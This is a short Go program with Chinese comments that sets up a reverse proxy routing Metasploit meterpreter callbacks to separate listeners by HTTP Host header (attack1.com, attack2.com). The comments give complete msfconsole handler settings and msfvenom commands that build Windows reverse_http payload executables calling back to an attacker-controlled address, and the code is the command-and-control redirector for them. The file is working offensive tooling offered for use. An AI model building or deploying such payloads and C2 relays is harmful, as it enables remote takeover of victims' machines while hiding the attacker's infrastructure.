package main

import (
	"fmt"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"

	"github.com/gorilla/mux"
)

//使用httputil实现饭代
// 首先使用msfconsule生成两个监听器
// use exploit/multi/handler
// set payload windows/meterpreter_reverse_http
// set LHOST 192.168.1.128    代理地址
// set LPORT 8080
// set ReverseListenerBindAddress 192.168.1.128  实际地址
// set ReverseListenerBindPort 10080
// exploit -j -z

// 启动两个 一个10080 一个20080

// 生成两个马 在windows上执行，会自动回链LHOST LPORT， 头信息分辨为attack1.com /attack2.com
// msfvenom -p windows/meterpreter_reverse_http LHOST=xx.xx.xx.xx LPORT=8080 HttpHostHeader=attack1.com -f exe -o payload.exe
// msfvenom -p windows/meterpreter_reverse_http LHOST=xx.xx.xx.xx LPORT=8080 HttpHostHeader=attack2.com -f exe -o payload2.exe

var (
	hostProxy = make(map[string]string)
	proxies   = make(map[string]*httputil.ReverseProxy) // 路由到代理
)

// 变量初始化
func init() {
	hostProxy["attack1.com"] = "http://192.168.1.128:10080"
	hostProxy["attack2.com"] = "http://192.168.1.128:20080"

	for k, v := range hostProxy {
		// 验证url合法性，并返回net.URL实例
		remote, err := url.Parse(v)
		fmt.Println(remote)
		if err != nil {
			panic(err)
		}
		// 创建反代实例
		proxies[k] = httputil.NewSingleHostReverseProxy(remote)
	}
}

func main() {
	r := mux.NewRouter()
	for host, proxy := range proxies {
		r.Host(host).Handler(proxy)
	}

	log.Fatalln(http.ListenAndServe(":8080", r))
}
